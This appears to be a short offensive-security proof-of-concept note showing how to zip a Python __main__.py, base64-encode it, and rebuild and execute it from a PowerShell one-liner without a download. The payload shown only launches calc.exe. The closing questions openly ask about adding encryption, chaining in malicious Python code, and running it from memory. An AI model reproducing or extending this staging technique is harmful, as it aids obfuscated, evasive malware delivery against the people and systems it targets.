# Python Code, Zipped, Base64 Encoded, Powershell Command with no download to deploy POC
## create __main__.py
```python
import os, sys
os.system('calc.exe')
```
## zip __main__.py file and Base64 Encode it
```powershell
Compress-Archive -Path .\__main__.py -DestinationPath .\python.zip
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Path\to\python.zip'))
echo $base64string

$base64string | Out-File '.\python64.txt'
cat .\python64.txt
```
#### Output: 
```
UEsDBBQAAAAIAAIYZVX04o2dJQAAACUAAAALAAAAX19tYWluX18ucHnLzC3ILypRyC/WUSiuLOblyi/WA9Ilqbka6smJOcl6qRWp6poAUEsBAhQAFAAAAAgAAhhlVfTijZ0lAAAAJQAAAAsAAAAAAAAAAAAAAAAAAAAAAF9fbWFpbl9fLnB5UEsFBgAAAAABAAEAOQAAAE4AAAAAAA==
```

## Base64 Decode to zip file
```powershell
$FileName = $HOME + '\python.zip'
[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String('UEsDBBQAAAAIAAIYZVX04o2dJQAAACUAAAALAAAAX19tYWluX18ucHnLzC3ILypRyC/WUSiuLOblyi/WA9Ilqbka6smJOcl6qRWp6poAUEsBAhQAFAAAAAgAAhhlVfTijZ0lAAAAJQAAAAsAAAAAAAAAAAAAAAAAAAAAAF9fbWFpbl9fLnB5UEsFBgAAAAABAAEAOQAAAE4AAAAAAA=='))
python $FileName 
```

#### Questions:
- can I add password protection or encryption? 
- could I chain this with malicious python code, which can be run from inside the zip file?
- could I remove or run the contents from powershell? 
- could I load contents directly into ram? 


